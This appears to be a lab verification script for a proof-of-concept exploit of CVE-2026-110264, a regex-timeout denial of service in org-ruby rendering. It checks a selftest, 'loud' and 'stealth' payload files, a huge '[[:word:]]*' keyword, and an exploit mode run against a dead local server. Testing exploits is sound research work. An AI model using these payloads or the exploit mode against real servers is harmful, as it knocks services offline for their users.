#!/usr/bin/env bash
# lab/verify.sh — end-to-end verification of the CVE-2026-110264 PoC, no GitLab needed.
# Runs: poc.py selftest + payload flavours + org-ruby Timeout oracle at 3 tiers.
# Exit 0 = PoC verified (vulnerable local stack behaves as documented).
set -u
cd "$(dirname "$0")/.."

PASS=0; FAIL=0
ok()   { echo "  [PASS] $1"; PASS=$((PASS+1)); }
bad()  { echo "  [FAIL] $1"; FAIL=$((FAIL+1)); }

echo "[*] 1/4 poc.py selftest (3-tier org-ruby)"
if timeout 120 python3 poc.py selftest 2>&1 | tee /tmp/verify_selftest.log | grep -q '\[VULN\]'; then
  ok "selftest reports VULN on vulnerable stack"
else
  bad "selftest did not report VULN (see /tmp/verify_selftest.log)"
fi

echo "[*] 2/4 payload flavours"
timeout 30 python3 poc.py payload -o /tmp/verify_loud.org >/dev/null 2>&1
timeout 30 python3 poc.py payload --stealth -o /tmp/verify_stealth.org >/dev/null 2>&1
[ "$(grep -c '^#+.*TODO' /tmp/verify_loud.org)" = "3" ] && ok "loud payload has 3 TODO directives" || bad "loud directives != 3"
[ "$(grep -c '^#+.*TODO' /tmp/verify_stealth.org)" = "3" ] && ok "stealth payload has 3 TODO directives" || bad "stealth directives != 3"
LOUDPCT=$(python3 -c "kw='[[:word:]]*'*35000; print(len(kw))")
[ "$LOUDPCT" = "385000" ] && ok "loud keyword 385000 chars (>32767)" || bad "loud keyword len=$LOUDPCT"

echo "[*] 3/4 org-ruby Timeout oracle (benign fast, large Timeout)"
if timeout 30 ruby lab/repro.rb --generate 5 /tmp/verify_benign.org >/dev/null 2>&1 \
  && timeout 30 ruby lab/repro.rb /tmp/verify_benign.org --budget 8 2>&1 | grep -q 'rendered OK'; then
  ok "benign renders fast"
else
  bad "benign render failed"
fi
if timeout 60 ruby lab/repro.rb /tmp/verify_loud.org --budget 8 2>&1 | grep -q 'VULN.*Timeout'; then
  ok "loud payload triggers Timeout oracle"
else
  bad "loud payload did not trigger Timeout"
fi

echo "[*] 4/4 offline exploit path (no server -> clean no-oracle, rc=1)"
if timeout 30 python3 poc.py exploit http://127.0.0.1:9 group/pub --verify --save /tmp/verify_ev.json >/dev/null 2>&1; then
  bad "exploit vs dead server should return rc=1"
else
  RC=$?
  [ "$RC" = "1" ] && ok "dead-server exploit rc=1 with connection-error label" || bad "exploit rc=$RC (want 1)"
fi
grep -q 'connection error' /tmp/verify_ev.json 2>/dev/null && ok "evidence JSON records connection error" || bad "evidence JSON missing"

echo "=== RESULT: PASS=$PASS FAIL=$FAIL ==="
rm -f /tmp/verify_loud.org /tmp/verify_stealth.org /tmp/verify_benign.org /tmp/verify_ev.json /tmp/verify_selftest.log
[ "$FAIL" = "0" ]
